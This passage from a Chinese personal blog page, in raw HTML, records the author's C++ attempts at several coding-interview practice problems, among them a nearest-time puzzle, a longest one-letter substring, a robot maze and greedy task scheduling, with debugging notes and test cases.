token=to_string(list1.second)+to_string(list2.second);</span><br><span class="line">        if(list1.second&lt;2)</span><br><span class="line">        &#123;</span><br><span class="line">         </span><br><span class="line">            if(!hh.count(hh[token]))</span><br><span class="line">            hh[token]=token;</span><br><span class="line">        &#125;</span><br><span class="line">        if(list1.second==2&amp;&amp;list2.second&lt;4)</span><br><span class="line">        &#123;</span><br><span class="line">           if(!hh.count(hh[token]))</span><br><span class="line">            hh[token]=token;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //构造可能的MM</span><br><span class="line">     for(pair&lt;char,int&gt;list1:mp)</span><br><span class="line">    for(pair&lt;char,int&gt;list2:mp)</span><br><span class="line">    &#123;</span><br><span class="line">        string token=to_string(list1.second)+to_string(list2.second);</span><br><span class="line">        if(list1.second&lt;7)</span><br><span class="line">        &#123;</span><br><span class="line">            if(!mm.count(mm[token]))</span><br><span class="line">            mm[token]=token;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // for(pair&lt;string,string&gt; list:hh)</span><br><span class="line">    //     cout&lt;&lt;list.first&lt;&lt;&quot;,&quot;&lt;&lt;list.second&lt;&lt;&quot; &quot;&lt;&lt;endl;</span><br><span class="line">    //     cout&lt;&lt;&quot;分钟里&quot;;</span><br><span class="line">    // for(pair&lt;string,string&gt; list:mm)</span><br><span class="line">    //     cout&lt;&lt;list.first&lt;&lt;&quot;,&quot;&lt;&lt;list.second&lt;&lt;&quot; &quot;&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    //看分钟里是否大于</span><br><span class="line">  //  string s=&quot;11:23&quot;;</span><br><span class="line">    int fenzhong=stoi(s.substr(3,2));</span><br><span class="line">    int xiaoshi=stoi(s.substr(0,2));</span><br><span class="line">   // cout&lt;&lt;s.substr(3,2);</span><br><span class="line">    string h=&quot;&quot;,m=&quot;&quot;;</span><br><span class="line">    int flag=-1;</span><br><span class="line">    for(pair&lt;string,string&gt; list:mm)</span><br><span class="line">    &#123;</span><br><span class="line">        if(stoi(list.second)&gt;fenzhong)</span><br><span class="line">        &#123;</span><br><span class="line">            m=list.second;</span><br><span class="line">            flag=1;</span><br><span class="line">            cout&lt;&lt;s.substr(0,2)+&quot;:&quot;+m;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //看小时里是否大于</span><br><span class="line">        </span><br><span class="line">       for(pair&lt;string,string&gt; list:hh)</span><br><span class="line">            cout&lt;&lt;list.second&lt;&lt;endl;</span><br><span class="line">            </span><br><span class="line">    if(flag&lt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">           for(pair&lt;string,string&gt; list:hh)</span><br><span class="line">    &#123;</span><br><span class="line">        if(stoi(list.second)&gt;xiaoshi)</span><br><span class="line">        &#123;</span><br><span class="line">            h=list.second;</span><br><span class="line">            flag=1;</span><br><span class="line">            cout&lt;&lt;h+&quot;:&quot;+s.substr(3,2);</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   //那就是第二天的时间，这个时间是比输入值小但又是最接近的时间</span><br><span class="line">   //倒序找吧</span><br><span class="line">   if(flag&lt;0)</span><br><span class="line">   &#123;</span><br><span class="line">        for(auto it=mm.rbegin();it!=mm.rend();it++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(stoi(it-&gt;second)&lt;fenzhong)</span><br><span class="line">        &#123;</span><br><span class="line">            m=it-&gt;second;</span><br><span class="line">            flag=1;</span><br><span class="line">            cout&lt;&lt;s.substr(0,2)+&quot;:&quot;+m;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(flag&lt;0)</span><br><span class="line">    &#123;</span><br><span class="line">       for(auto it=hh.rbegin();it!=hh.rend();it++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(stoi(it-&gt;second)&lt;xiaoshi)</span><br><span class="line">        &#123;</span><br><span class="line">            h=it-&gt;second;</span><br><span class="line">            flag=1;</span><br><span class="line">            cout&lt;&lt;h+&quot;:&quot;+s.substr(3,2);</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">    // char s1=static_cast&lt;char&gt;(97);</span><br><span class="line">    // char s=1+&#x27;0&#x27;;</span><br><span class="line">    // cout&lt;&lt;s;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现的目标：</p>
<blockquote>
<p>先找分钟有没有满足的，即大于真实分钟</p>
<p>不通过</p>
<p>再找小时有没有满足的，即大于真实小时</p>
<p>也不通过</p>
<p>说明是第二天的了</p>
<p>找第二天最小的</p>
</blockquote>
<p>输入23:59 真实时间是22:22 ，而不是23:53</p>
<p>第二天就是要找最小的，而不是最接近的了。</p>
<p>而且是小时和分钟都找最小的嘞</p>
<p>看了其他用例才知道</p>
<p><strong>12:58得到15:11</strong> 这个时间确实比15:58接近。</p>
<p>而且，对于正常情况，小时和分钟要同时保证<strong>现在时间</strong>要 <strong>最接近</strong> <strong>真实时间</strong></p>
<p>不是单纯</p>
<p>那得计算了诶，想简单了。</p>
<p>h*60+m 保持差值最小吧</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><blockquote>
<p>&#x2F;<em>思路（<br>正常情况下：结果为大于当前时间中，最小的那个真实时间，是*<em>大于当前时间的</em></em><br>特殊情况下：第二天的时间，即最小的真实时间，是<strong>小于当前时间</strong>的</p>
<p>能不能理解为，正常情况下：小时大于当前，分钟小于当前</p>
<p>​						特殊情况下：都小哈？</p>
<p>*&#x2F;</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    int fenzhong=stoi(s.substr(3,2));</span><br><span class="line">    int xiaoshi=stoi(s.substr(0,2));</span><br><span class="line">   // cout&lt;&lt;s.substr(3,2);</span><br><span class="line">    string h=&quot;&quot;,m=&quot;&quot;;</span><br><span class="line">    int flag=-1;</span><br><span class="line">  </span><br><span class="line">    //看小时里是否大于</span><br><span class="line">        for(pair&lt;string,string&gt;list:hh)</span><br><span class="line">        &#123;</span><br><span class="line">            if(stoi(list.second)&gt;xiaoshi)</span><br><span class="line">            &#123;</span><br><span class="line">                flag=2;</span><br><span class="line">                h=list.second;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(flag==2)//如果有满足的小时，找满足的分钟</span><br><span class="line">        &#123;</span><br><span class="line">             for(pair&lt;string,string&gt;list:mm)</span><br><span class="line">        &#123;</span><br><span class="line">            if(stoi(list.second)&lt;fenzhong)</span><br><span class="line">            &#123;</span><br><span class="line">                flag=3;</span><br><span class="line">                m=list.second;</span><br><span class="line">                cout&lt;&lt;h+&quot;:&quot;+m;</span><br><span class="line">                return 0;//结束了</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        if(flag&lt;0)//不然就是第二天的了</span><br><span class="line">        &#123;</span><br><span class="line">             for(pair&lt;string,string&gt;list:hh)</span><br><span class="line">        &#123;</span><br><span class="line">            if(stoi(list.second)&lt;xiaoshi)</span><br><span class="line">            &#123;</span><br><span class="line">                //flag=2;</span><br><span class="line">                h=list.second;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">              for(pair&lt;string,string&gt;list:mm)</span><br><span class="line">        &#123;</span><br><span class="line">            if(stoi(list.second)&lt;fenzhong)</span><br><span class="line">            &#123;</span><br><span class="line">              //  flag=3;</span><br><span class="line">                m=list.second;</span><br><span class="line">                cout&lt;&lt;h+&quot;:&quot;+m;</span><br><span class="line">                return 0;//结束了</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>哦豁</p>
<blockquote>
<p>18:52<br>输出21:11  </p>
<p>正确应该是18:55</p>
</blockquote>
<p>那就是针对小时的筛选，要大于等于当前小时，</p>
<p>trueh*60+truem&gt;curh*60+curm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(pair&lt;string,string&gt;list:hh)</span><br><span class="line">       &#123;</span><br><span class="line">           if(stoi(list.second)&gt;=xiaoshi)</span><br><span class="line">           &#123;</span><br><span class="line">               flag=2;</span><br><span class="line">               h=list.second;</span><br><span class="line">               break;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       if(flag==2)//如果有满足的小时，找满足的分钟</span><br><span class="line">       &#123;</span><br><span class="line">            for(pair&lt;string,string&gt;list:mm)</span><br><span class="line">       &#123;</span><br><span class="line">           if(stoi(h)*60+stoi(list.second)&gt;xiaoshi*60+fenzhong)</span><br><span class="line">           &#123;</span><br><span class="line">               m=list.second;</span><br><span class="line">               cout&lt;&lt;h+&quot;:&quot;+m;</span><br><span class="line">               return 0;//结束了</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>07:08 又没值了? 真实时间应该是08</p>
</blockquote>
<p>因为逻辑是大于等于当前小时，真实小时用的是07.。。</p>
<p>还是要研判一下，小时，什么时候取相同的，什么时候取大一点的，什么时候取第二天的</p>
<p>取决于什么嘞。</p>
<h2 id="个人代码（最终）"><a href="#个人代码（最终）" class="headerlink" title="个人代码（最终）"></a>个人代码（最终）</h2><blockquote>
<p>思想：</p>
<p>1.看在相同小时下，能否获得比当前分钟大的真实分钟</p>
<p>2.看在稍大的小时下，能否使得trueh*60+truem&gt;curh*60+curm</p>
<p>3.看在第二天的时间下，是否有真实小时小于当前小时，真实分钟小于当前分钟的时间</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    /*思路1，</span><br><span class="line">    正常情况下：组合遍历，结果为大于原时间中，最小的那个时间</span><br><span class="line">    特殊情况下：第二天的时间，最小于的时间</span><br><span class="line">    */</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    </span><br><span class="line">      if(s==&quot;00:00&quot;) </span><br><span class="line">    &#123;</span><br><span class="line">    cout&lt;&lt;&quot;00:00&quot;;</span><br><span class="line">    return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    map&lt;char,int&gt; mp;</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i]!=&#x27;:&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            if(!mp.count(s[i]))</span><br><span class="line">            &#123;</span><br><span class="line">                mp[s[i]]=s[i]-&#x27;0&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    map&lt;string,string&gt; hh,mm;</span><br><span class="line"> </span><br><span class="line">   </span><br><span class="line">   // 构造可能的HH</span><br><span class="line">    for(pair&lt;char,int&gt;list1:mp)</span><br><span class="line">    for(pair&lt;char,int&gt;list2:mp)</span><br><span class="line">    &#123;</span><br><span class="line">        string token=to_string(list1.second)+to_string(list2.second);</span><br><span class="line">        if(list1.second&lt;2)</span><br><span class="line">        &#123;</span><br><span class="line">         </span><br><span class="line">            if(!hh.count(hh[token]))</span><br><span class="line">            hh[token]=token;</span><br><span class="line">        &#125;</span><br><span class="line">        if(list1.second==2&amp;&amp;list2.second&lt;4)</span><br><span class="line">        &#123;</span><br><span class="line">           if(!hh.count(hh[token]))</span><br><span class="line">            hh[token]=token;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //构造可能的MM</span><br><span class="line">     for(pair&lt;char,int&gt;list1:mp)</span><br><span class="line">    for(pair&lt;char,int&gt;list2:mp)</span><br><span class="line">    &#123;</span><br><span class="line">        string token=to_string(list1.second)+to_string(list2.second);</span><br><span class="line">        if(list1.second&lt;7)</span><br><span class="line">        &#123;</span><br><span class="line">            if(!mm.count(mm[token]))</span><br><span class="line">            mm[token]=token;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int fenzhong=stoi(s.substr(3,2));</span><br><span class="line">    int xiaoshi=stoi(s.substr(0,2));</span><br><span class="line">   // cout&lt;&lt;s.substr(3,2);</span><br><span class="line">    string h=&quot;&quot;,m=&quot;&quot;;</span><br><span class="line">    int flag=-1;</span><br><span class="line"></span><br><span class="line">//       for(pair&lt;string,string&gt;list:hh)</span><br><span class="line">//         cout&lt;&lt;list.second&lt;&lt;&quot; &quot;;</span><br><span class="line"></span><br><span class="line">//    for(pair&lt;string,string&gt;list:mm)</span><br><span class="line">//         cout&lt;&lt;list.second&lt;&lt;&quot; &quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//先看仅凭分钟能否解决 (即真实小时相同时)</span><br><span class="line">  for(pair&lt;string,string&gt;list:mm)</span><br><span class="line">        &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                 if(stoi(list.second)&gt;fenzhong)</span><br><span class="line">            &#123;</span><br><span class="line">                m=list.second;</span><br><span class="line">                cout&lt;&lt;s.substr(0,2)+&quot;:&quot;+m;</span><br><span class="line">                return 0;//结束了</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    //看小时里是否大于</span><br><span class="line">        for(pair&lt;string,string&gt;list:hh)</span><br><span class="line">        &#123;</span><br><span class="line">            if(stoi(list.second)&gt;xiaoshi)</span><br><span class="line">            &#123;</span><br><span class="line">                flag=2;</span><br><span class="line">                h=list.second;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       // cout&lt;&lt;h;</span><br><span class="line">        int diertian=-1;</span><br><span class="line">        if(flag&lt;0)//没有满足的小时，那就是第二天的小时了，要小于</span><br><span class="line">        &#123;</span><br><span class="line">             for(pair&lt;string,string&gt;list:hh)</span><br><span class="line">        &#123;</span><br><span class="line">            if(stoi(list.second)&lt;xiaoshi)//取个小的</span><br><span class="line">            &#123;</span><br><span class="line">                flag=2;</span><br><span class="line">                diertian=1;</span><br><span class="line">                h=list.second;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(flag==2)//如果有满足的小时，找满足的分钟</span><br><span class="line">        &#123;</span><br><span class="line">             for(pair&lt;string,string&gt;list:mm)</span><br><span class="line">        &#123;</span><br><span class="line">            if(diertian&lt;0) //不用到第二天</span><br><span class="line">            &#123;</span><br><span class="line">                 if(stoi(h)*60+stoi(list.second)&gt;xiaoshi*60+fenzhong)</span><br><span class="line">            &#123;</span><br><span class="line">                m=list.second;</span><br><span class="line">                cout&lt;&lt;h+&quot;:&quot;+m;</span><br><span class="line">                return 0;//结束了</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else //第二天</span><br><span class="line">            &#123;</span><br><span class="line">                if(stoi(list.second)&lt;=fenzhong)</span><br><span class="line">                &#123;</span><br><span class="line">                     m=list.second;</span><br><span class="line">                    cout&lt;&lt;h+&quot;:&quot;+m;</span><br><span class="line">                    return 0;//结束了</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试样例：</p>
<p><em><strong>20:12得到20:20</strong></em></p>
<p><em><strong>23:59得到22:22</strong></em></p>
<p><em><strong>12:58得到15:11</strong></em></p>
<p><em><strong>18:52得到18:55</strong></em></p>
<p><em><strong>23:52得到23:53</strong></em></p>
<p><em><strong>09:17得到09:19</strong></em></p>
<p><strong>07:08得到08:00</strong></p>
<p>噢，这个00:00，那就单独列出来输出00:00吧</p>
<h1 id="25求满足条件的最长子串的长度"><a href="#25求满足条件的最长子串的长度" class="headerlink" title="25求满足条件的最长子串的长度"></a>25求满足条件的最长子串的长度</h1><p>给定一个字符串，只包含字母和数字，按要求找出字符串中的最长（连续）子串的长度，字符串本身是其最长的子串，子串要求：<br>1、 只包含1个字母(a<del>z, A</del>Z)，其余必须是数字；<br>2、 字母可以在子串中的任意位置；<br>如果找不到满足要求的子串，如全是字母或全是数字，则返回-1。<br>输入描述：字符串(只包含字母和数字)<br>输出描述：子串的长度</p>
<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><h2 id="个人代码-12"><a href="#个人代码-12" class="headerlink" title="个人代码"></a>个人代码</h2><p>输入 abC124ACb </p>
<p>输出 4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line"></span><br><span class="line">    int flag=0,len=0,zimu,shuzi;//flag,子串中是否已经有一个字母了</span><br><span class="line">    string token=&quot;&quot;;</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i]&lt;&#x27;0&#x27;||s[i]&gt;&#x27;9&#x27;)//非数字</span><br><span class="line">        &#123;</span><br><span class="line">            zimu++;</span><br><span class="line">            if(flag==0)//子串没有字母的话</span><br><span class="line">            &#123;</span><br><span class="line">                token+=s[i];   //</span><br><span class="line">                flag=1;</span><br><span class="line">            &#125;</span><br><span class="line">            else//如果遇到新的字母了，将之前的len更新，重置</span><br><span class="line">            &#123;</span><br><span class="line">                len=max(len,int(token.size()));</span><br><span class="line">                token=&quot;&quot;;</span><br><span class="line">                flag=0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else </span><br><span class="line">        &#123;</span><br><span class="line">            shuzi++;</span><br><span class="line">            token+=s[i];</span><br><span class="line">             len=max(len,int(token.size()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //cout&lt;&lt;token;</span><br><span class="line">    //全是字母 or 全是数字则为-1</span><br><span class="line">    if(zimu==token.size()||shuzi==token.size()) cout&lt;&lt;-1;</span><br><span class="line">    else cout&lt;&lt;len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="26-机器人走迷宫"><a href="#26-机器人走迷宫" class="headerlink" title="*26.机器人走迷宫"></a>*26.机器人走迷宫</h1><p>1、房间由X*Y的方格组成，例如下图为6*4的大小。每一个方格以坐标(x，y)描述。<br>2、机器人固定从方格(0，0)出发，只能向东或者向北前进。出口固定为房间的最东角，如下图的方格(5，3)。用例保证机器人可以从入口走到出口。<br>3、房间有些方格是墙壁，如(4，1)，机器人不能经过那儿。<br>4、有些地方是一旦到达就无法走到出口的,如标记为B的方格,称之为陷阱方格。<br>5、有些地方是机器人无法到达的的，如标记为A的方格，称之为不可达方格，不可达方格不包括墙壁所在的位置。<br>6、如下示例图中，陷阱方格有2个,不可达方格有3个。<br>7、请为该机器人实现路径规划功能:给定房间大小、墙壁位置，请计算出陷阱方格与不可达方格分别有多少个。</p>
<p><img src="/../../../Typora/img111/image-20230718181515105.png" alt="image-20230718181515105"></p>
<h2 id="输入-17"><a href="#输入-17" class="headerlink" title="输入"></a>输入</h2><p>第一行为房间的x,y</p>
<p>第二行为房间墙壁个数n</p>
<p>N行墙壁的坐标</p>
<h2 id="输入描述-20"><a href="#输入描述-20" class="headerlink" title="输入描述"></a>输入描述</h2><ol>
<li>第一行为房间的<code>x</code>和<code>y</code>(<code>0 &lt; x,y &lt;= 1000</code>)</li>
<li>第二行为房间中墙壁的个数<code>N</code> (<code>0 &lt;= N &lt; X*Y</code>)</li>
<li>接着下面会有<code>N</code>行墙壁的坐标<br>同一行中如果有多个数据以一个空格隔开，用例保证所有的输入数据均合法，(结尾不带回车换行)</li>
</ol>
<h2 id="输出描述-20"><a href="#输出描述-20" class="headerlink" title="输出描述"></a>输出描述</h2><ol>
<li>陷阱方格与不可达方格数量，两个信息在一行中输出，以一个空格隔开。(结尾不带回车换行)</li>
</ol>
<h2 id="示例一-11"><a href="#示例一-11" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-18"><a href="#输入-18" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6 4</span><br><span class="line">5</span><br><span class="line">0 2</span><br><span class="line">1 2</span><br><span class="line">2 2</span><br><span class="line">4 1</span><br><span class="line">5 1</span><br></pre></td></tr></table></figure>

<h3 id="输出-17"><a href="#输出-17" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 3</span><br></pre></td></tr></table></figure>

<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>1.定义类o，接收x,y坐标</p>
<p>2.先接收wall坐标，o.x&#x3D;wall[i][0],o.y&#x3D;wall[i][1]，并赋值给set&lt;o&gt; wallset</p>
<p>3.set&lt;o&gt; checks，接收所有可走的坐标</p>
<p>​	set&lt;o&gt; finish;接收到达终点坐标时的所<strong>经过的有效坐标</strong></p>
<p>​	通过递归函数实现值的输入findout(0,0,wallset,checks,finish)</p>
<p>4.不可达坐标数&#x3D;x*y-checks.size()-wallset.size();</p>
<p>5.陷阱数计算：</p>
<p>​	遍历finish</p>
<p>​	findout(finish.x,finish.y，wallset,checksT,finishT)</p>
<p>​	如果在以finish.x和finish.y以起点的有效坐标中没找到可以到达终点的有效坐标，trap++</p>
<p>​	(if(!count(finishT.begin(),finishT.end(),终点坐标)))</p>
<p>​	</p>
<h1 id="27-高效的任务规划"><a href="#27-高效的任务规划" class="headerlink" title="**27.高效的任务规划"></a>**27.高效的任务规划</h1><p>你有 n 台机器编号为 1~n，每台都需要完成完成一项工作，机器经过配置后都能完成独立完成一项工作。假设第 i 台机器你需要花 B 分钟进行设置，然后开始运行，J 分钟后完成任务。现在，你需要选择布置工作的顺序，使得用最短的时间完成所有工作。注意，不能同时对两台进行配置，但配置完成的机器们可以同时执行他们各自的工作。</p>
<h2 id="输入描述："><a href="#输入描述：" class="headerlink" title="输入描述："></a>输入描述：</h2><p>第一行输入代表总共有 M 组任务数据（1 &lt; M &lt;&#x3D; 10）。<br>每组数据第一行为一个整数指定机器的数量 N（0 &lt; N &lt;&#x3D; 1000）。随后的 N 行每行两个整数，第一个表示B（0 &lt;&#x3D; B &lt;&#x3D; 10000），第二个表示 J（0 &lt;&#x3D; J &lt;&#x3D; 10000）。</p>
<p>每组数据连续输入，不会用空行分隔。各组任务单独计时。</p>
<h2 id="输出描述："><a href="#输出描述：" class="headerlink" title="输出描述："></a>输出描述：</h2><p>对于每组任务，输出最短完成时间，且每组的结果独占一行。例如，两组任务就应该有两行输出。</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1"></a>示例 1</h2><p>输入<br>1<br>1<br>2 2<br>输出<br>4</p>
<h2 id="示例2-2"><a href="#示例2-2" class="headerlink" title="示例2"></a>示例2</h2><p>输入</p>
<p>2</p>
<p>2</p>
<p>1 1</p>
<p>2 2</p>
<p>3 </p>
<p>1 1</p>
<p>2 2</p>
<p>3 3</p>
<p>输出</p>
<p>4</p>
<p>7</p>
<p>没读懂最短完成时间怎么来的</p>
<p>先配置工作时间最多的机器</p>
<p>当配置3，工作3的时候</p>
<p>可以顺便配置2，配置1</p>
<p>这时候只用了6分钟</p>
<p>那么在工作2和1并发的时候，只需要1分钟</p>
<p>总共7分钟</p>
<p><strong>贪心思想</strong>：经典问题就是，找零钱和活动选择(尽可能最优)</p>
<h2 id="参考wp-结果有误"><a href="#参考wp-结果有误" class="headerlink" title="参考wp(结果有误)"></a>参考wp(结果有误)</h2><p>这种输入输出方法值得借鉴，用类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct task&#123;</span><br><span class="line">    int tpei=0;</span><br><span class="line">    int tzuo=0;</span><br><span class="line">    task()&#123;&#125;</span><br><span class="line">    task(int x,int y):tpei(x),tzuo(y)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">class Solution&#123;</span><br><span class="line">    public:</span><br><span class="line">    int taskfinishi(vector&lt;task&gt; &amp;machine)&#123;</span><br><span class="line">        sort(machine.begin(),machine.end(),[](task &amp;a,task &amp;b)&#123;return a.tzuo&gt;b.tzuo;&#125;);</span><br><span class="line">      int last=0;</span><br><span class="line">     int N=machine.size();</span><br><span class="line">     vector&lt;int&gt; dp(N);</span><br><span class="line">      for(int i=0;i&lt;N;i++)//贪心</span><br><span class="line">      &#123;</span><br><span class="line">        dp[i]=last+machine[i].tpei+machine[i].tzuo;</span><br><span class="line">        last+=machine[i].tpei;</span><br><span class="line">      &#125;</span><br><span class="line">    int ans=0;</span><br><span class="line">    for(int i=0;i&lt;N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans=max(ans,dp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int m,n;</span><br><span class="line"></span><br><span class="line">    cin&gt;&gt;m;//m组任务</span><br><span class="line">  //  vector&lt;int&gt; s(n);</span><br><span class="line">    //先执行工作时间最长的</span><br><span class="line">    // for(int j=0;j&lt;m;j++)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     cin&gt;&gt;n;//第j组任务所需要机器数</span><br><span class="line">    // vector&lt;int&gt; a[n];//n行2列</span><br><span class="line">    //     for(int i=0;i&lt;n;i++)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     int b1,b2;</span><br><span class="line">    //     cin&gt;&gt;b1&gt;&gt;b2;</span><br><span class="line">    //     a[i].push_back(b1);</span><br><span class="line">    //     a[i].push_back(b2);</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    // &#125;</span><br><span class="line">    Solution a;</span><br><span class="line">    while(m--)</span><br><span class="line">    &#123;</span><br><span class="line">        int n;</span><br><span class="line">        cin&gt;&gt;n;</span><br><span class="line">        vector&lt;task&gt; machine(n);</span><br><span class="line">        for(int i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin&gt;&gt;machine[i].tpei&gt;&gt;machine[i].tzuo;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;a.taskfinishi(machine)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来自<a href="https://blog.csdn.net/zhizhengguan">OceanStar的学习笔记</a></p>
<p>&#x2F;&#x2F; [](task &amp;a,task &amp;b){return a.tzuo&gt;b.tzuo;})  λ表达式</p>
<h2 id="个人代码-13"><a href="#个人代码-13" class="headerlink" title="个人代码"></a>个人代码</h2><p>参考<a href="https://leetcode.cn/circle/discuss/EC2mv8/">高效任务规划</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;a,vector&lt;<span class="type">int</span>&gt; &amp;b)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// if(a[1]&gt;b[1]) return true;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// else return false;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// if(a[1]&gt;b[1]) return a&gt;b;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// else return a&lt;b;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a[<span class="number">1</span>]&gt;b[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> m,n;</span><br><span class="line"></span><br><span class="line">  cin&gt;&gt;m;<span class="comment">//m组任务</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//vector&lt;int&gt; s(n);</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 先执行工作时间最长的</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">   cin&gt;&gt;n;<span class="comment">//第j组任务所需要机器数</span></span><br><span class="line"></span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt; &gt;<span class="built_in">a</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">2</span>));<span class="comment">//n行2列</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> 